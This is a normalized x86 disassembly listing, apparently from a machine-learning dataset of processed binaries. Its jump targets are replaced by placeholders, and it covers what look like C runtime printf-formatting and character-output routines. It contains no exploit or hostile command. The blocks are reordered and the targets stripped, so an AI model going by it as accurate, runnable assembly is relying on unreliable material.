sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_439e30
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
neg edx
sbb edx edx
and edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_439e70
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_4268f3
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_439fa0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43a1bf
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43a1e5
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43a20b
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43a231
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4422b9
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43a257
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_43395a
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_43a28a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_43a257
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_43a2b0
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_43a257
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_43a257
sub_43a312
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_42b774
call sub_4268f3
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_437094
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_43af26 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_439fa0
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_43a257
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_43a257
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_42578a
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_43a2b0
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_439e5a
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_4420e9
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_43a2b0
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_43a257
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_42acad
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_437480
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_43a257
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_427be0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_43a2b0
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_43a257
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_4420e9
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_43af46
mov edi edi
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi + 0x8 ]
cmp al 0x70
je r-xdata
xor ecx ecx
cmp al bl
sete cl
mov eax ecx
cmp bl 0x70
je r-xdata
cmp al 0x73
je r-xdata
xor edx edx
inc edx
cmp al 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp bl 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax 0x810
and ecx eax
neg ecx
sbb ecx ecx
and edx eax
neg ecx
neg edx
sbb edx edx
neg edx
cmp ecx edx
jne r-xdata
mov dl 0x64
cmp al dl
je r-xdata
test edx edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp al 0x69
je r-xdata
xor eax eax
inc eax
cmp bl 0x69
je r-xdata
cmp al dl
je r-xdata
cmp al 0x6f
je r-xdata
mov eax [ esi + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp bl 0x6f
je r-xdata
cmp al 0x69
je r-xdata
cmp al 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp bl 0x75
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x78
je r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp bl 0x78
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x58
je r-xdata
cmp al 0x78
je r-xdata
cmp bl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x69
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x6f
je r-xdata
cmp bl dl
je r-xdata
cmp bl 0x75
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x58
jne r-xdata
sub_43b071
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_43395a
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_43b0a4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_43b071
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_43b0ca
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_43b071
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_43b071
sub_43b141
mov edi edi
push ebp
mov ebp esp
sub esp 0x8d8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x87c ]
mov [ ebp - 0x89c ] esi
mov [ ebp - 0x854 ] eax
mov [ ebp - 0x8b8 ] edi
mov [ ebp - 0x850 ] edi
mov [ ebp - 0x8a0 ] edi
mov [ ebp - 0x8b4 ] edi
mov [ ebp - 0x8a8 ] edi
call sub_42b774
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x898 ] edi
call sub_4268f3
mov [ ebp - 0x8bc ] eax
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x870 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
push esi
call sub_437094
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x874 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x880 ] edi
mov [ ebp - 0x8d8 ] ebx
mov [ ebp - 0x864 ] edi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov eax [ ebp - 0x8d8 ]
or [ ebp - 0x894 ] 0xffffffff
or [ ebp - 0x86c ] 0xffffffff
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x888 ] edi
mov bl [ eax ]
mov [ ebp - 0x8ac ] edi
mov [ ebp - 0x8b0 ] edi
mov [ ebp - 0x890 ] edi
mov [ ebp - 0x858 ] edi
mov [ ebp - 0x85c ] bl
test bl bl
